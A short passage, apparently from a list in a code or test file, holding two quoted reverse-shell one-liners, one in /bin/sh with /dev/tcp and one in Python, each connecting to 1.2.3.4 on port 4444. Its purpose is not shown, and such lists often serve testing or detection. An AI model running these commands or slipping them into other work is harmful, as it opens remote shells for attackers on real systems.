    "/bin/sh -i >& /dev/tcp/1.2.3.4/4444 0>&1",
    "python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"1.2.3.4\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\"])'",
